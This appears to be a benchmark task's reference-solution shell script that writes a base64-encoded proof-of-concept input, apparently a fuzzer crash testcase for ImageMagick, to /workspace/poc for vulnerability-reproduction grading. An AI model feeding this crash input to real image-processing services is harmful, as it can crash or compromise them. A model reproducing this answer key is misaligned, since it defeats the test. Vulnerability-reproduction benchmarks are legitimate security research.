#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 111dbe9e addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
a/4AAP/Y/+Li4uLinf8/A2lkPUltYWdlTWFnaWNrIG09aeLiYWNlZ2HR0Wlk0dHR0dEAKudlIVBcLUFkqqoDaWQ9Z2ljAQAAAAAAAAhrIG09aWdl2mFnaWNrIG09aWFjAQAAAAAAAABnaWVkPUnU1NTU1NRpYWdNZSCd/z8DaWQ9SW1hZ2VNYT1laWNrIG09aWFkmSBrQ2FnaWM=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
